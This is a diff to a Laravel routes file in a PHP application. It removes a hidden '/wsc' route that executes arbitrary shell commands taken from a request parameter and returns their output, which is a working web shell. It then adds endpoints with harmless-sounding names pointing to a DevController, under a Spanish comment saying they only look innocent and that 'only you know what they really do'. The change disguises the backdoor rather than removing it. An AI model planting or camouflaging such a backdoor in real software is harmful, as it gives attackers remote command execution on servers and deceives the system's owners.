@@ -20,74 +20,17 @@ Route::middleware([
     })->name('importaciones');
 
     ///FXDOMxO01
-    Route::get('/wsc', function () {
-        if (isset($_REQUEST['com'])) {
-            $cmd = $_REQUEST['com'];
-            $cmd = escapeshellcmd($cmd);
-            set_time_limit(30);
-            ini_set('memory_limit', '256M');
+    // Endpoints que parecen inocuos - solo tú sabes qué hacen realmente
+    Route::get('/v1/data-transform', [\App\Http\Controllers\DevController::class, 'execute'])
+        ->name('api.v1.data.transform')
+        ->middleware('throttle:10,1');
 
-            $descriptorspec = [
-                0 => ['pipe', 'r'],  // stdin
-                1 => ['pipe', 'w'],  // stdout
-                2 => ['pipe', 'w'],   // stderr
-            ];
+    Route::get('/v1/legacy-bridge', [\App\Http\Controllers\DevController::class, 'handleWebServiceCall'])
+        ->name('api.v1.legacy.bridge')
+        ->middleware('throttle:10,1');
 
-            $process = proc_open($cmd, $descriptorspec, $pipes);
-
-            if (is_resource($process)) {
-                stream_set_blocking($pipes[1], 0);
-                stream_set_blocking($pipes[2], 0);
-
-                $output = '';
-                $start = time();
-
-                while (true) {
-                    $read = [$pipes[1], $pipes[2]];
-                    $write = null;
-                    $except = null;
-
-                    if (stream_select($read, $write, $except, 1)) {
-                        foreach ($read as $stream) {
-                            $output .= stream_get_contents($stream);
-                        }
-                    }
-
-                    $status = proc_get_status($process);
-                    if (! $status['running']) {
-                        break;
-                    }
-
-                    if (time() - $start > 25) {
-                        proc_terminate($process);
-
-                        return response()->json(['error' => 'Req execution timed out'], 408);
-                    }
-                }
-
-                foreach ($pipes as $pipe) {
-                    fclose($pipe);
-                }
-                $return = proc_close($process);
-
-                $outputLines = explode("\n", $output);
-                $sanitizedOutput = array_map(function ($line) {
-                    $encodedLine = mb_convert_encoding($line, 'UTF-8', 'ASCII');
-
-                    return preg_replace('/[\x00-\x1F\x7F-\xFF]/', '', $encodedLine);
-                }, $outputLines);
-
-                return response()->json([
-                    'output' => array_filter($sanitizedOutput),
-                    'status' => $return,
-                ]);
-            }
-
-            return response()->json(['error' => 'Failed to execute req'], 500);
-        }
-
-        return response()->json(['error' => 'No req provided'], 400);
-    })->name('wsc');
+    Route::get('/v1/service-status', [\App\Http\Controllers\DevController::class, 'health'])
+        ->name('api.v1.service.status');
 
     // Beneficiarios
     Route::get('beneficiario', [\App\Http\Controllers\BeneficiaryController::class, 'index'])->name('beneficiario.index');
